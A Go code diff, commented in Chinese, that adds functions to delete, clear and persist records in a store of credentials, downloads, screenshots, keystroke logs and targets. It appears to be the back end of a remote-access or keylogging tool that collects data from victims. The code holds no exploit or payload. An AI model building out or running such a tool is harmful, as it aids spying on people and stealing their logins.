@@ -349,3 +349,120 @@ func storePrune() {
 		stStore.keylogs = stStore.keylogs[len(stStore.keylogs)-2500:]
 	}
 }
+
+// ---------------------------------------------------------------- 删除/清空 (带持久化)
+
+// removeByID 从切片中按 ID 删除一个元素 (所有记录类型都有 ID 字段)。
+func removeByID[T any](slice []T, getID func(T) uint64, target uint64) ([]T, bool) {
+	for i := range slice {
+		if getID(slice[i]) == target {
+			return append(slice[:i], slice[i+1:]...), true
+		}
+	}
+	return slice, false
+}
+
+// storeRewriteLocked 全量重写落盘文件, 用于删除/清空后持久化 (否则重启后删除项会复活)。
+// 调用方需持有 stStore.mu 写锁。
+func storeRewriteLocked() {
+	var all []interface{}
+	for _, c := range stStore.creds {
+		all = append(all, c)
+	}
+	for _, d := range stStore.downloads {
+		all = append(all, d)
+	}
+	for _, s := range stStore.screenshots {
+		all = append(all, s)
+	}
+	for _, k := range stStore.keylogs {
+		all = append(all, k)
+	}
+	for _, e := range stStore.events {
+		all = append(all, e)
+	}
+	for _, t := range stStore.targets {
+		all = append(all, t)
+	}
+
+	if err := os.MkdirAll(dataDir, 0o755); err != nil {
+		return
+	}
+	f, err := os.Create(storeFile)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	for _, v := range all {
+		if b, err := json.Marshal(v); err == nil {
+			f.Write(append(b, '\n'))
+		}
+	}
+}
+
+// storeDeleteRecord 按类型 + ID 删除一条记录并持久化。
+func storeDeleteRecord(kind RecordKind, id uint64) bool {
+	stStore.mu.Lock()
+	defer stStore.mu.Unlock()
+
+	var removed bool
+	switch kind {
+	case KindCredential:
+		stStore.creds, removed = removeByID(stStore.creds, func(c Credential) uint64 { return c.ID }, id)
+	case KindDownload:
+		stStore.downloads, removed = removeByID(stStore.downloads, func(d Download) uint64 { return d.ID }, id)
+	case KindScreenshot:
+		stStore.screenshots, removed = removeByID(stStore.screenshots, func(s Screenshot) uint64 { return s.ID }, id)
+	case KindKeystroke:
+		stStore.keylogs, removed = removeByID(stStore.keylogs, func(k Keystroke) uint64 { return k.ID }, id)
+	case KindEvent:
+		stStore.events, removed = removeByID(stStore.events, func(e Event) uint64 { return e.ID }, id)
+	case KindTarget:
+		stStore.targets, removed = removeByID(stStore.targets, func(t Target) uint64 { return t.ID }, id)
+	}
+	if !removed {
+		return false
+	}
+	storeRewriteLocked()
+	return true
+}
+
+// storeClear 清空某类记录并持久化。
+func storeClear(kind RecordKind) {
+	stStore.mu.Lock()
+	defer stStore.mu.Unlock()
+	switch kind {
+	case KindCredential:
+		stStore.creds = nil
+	case KindDownload:
+		stStore.downloads = nil
+	case KindScreenshot:
+		stStore.screenshots = nil
+	case KindKeystroke:
+		stStore.keylogs = nil
+	case KindEvent:
+		stStore.events = nil
+	}
+	storeRewriteLocked()
+}
+
+// storeFindPath 按类型 + ID 查找记录的 Path (download/screenshot 用, 删除前先删落盘文件)。
+func storeFindPath(kind RecordKind, id uint64) string {
+	stStore.mu.RLock()
+	defer stStore.mu.RUnlock()
+	switch kind {
+	case KindDownload:
+		for _, d := range stStore.downloads {
+			if d.ID == id {
+				return d.Path
+			}
+		}
+	case KindScreenshot:
+		for _, s := range stStore.screenshots {
+			if s.ID == id {
+				return s.Path
+			}
+		}
+	}
+	return ""
+}
